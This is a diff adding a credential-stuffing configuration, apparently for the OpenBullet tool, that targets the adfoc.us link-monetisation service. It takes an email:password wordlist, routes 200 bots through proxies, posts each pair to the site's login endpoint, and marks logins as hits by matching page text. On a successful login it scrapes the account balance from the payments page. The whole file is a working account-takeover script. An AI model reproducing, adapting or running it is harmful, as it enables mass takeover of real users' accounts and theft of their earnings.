@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "AdFocus",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-09T09:06:46.5893424+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "EmailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://adfoc.us/session/create" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://adfoc.us" 
+  HEADER "referer: https://adfoc.us/" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Lost Password?" 
+  KEYCHAIN Success OR 
+    KEY ">Logout<" 
+REQUEST GET "https://adfoc.us/payments" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<strong>Account Balance:</strong> <span class=\"balance\" id=\"bold\">$" "</span><br/>" -> CAP "Argent" 
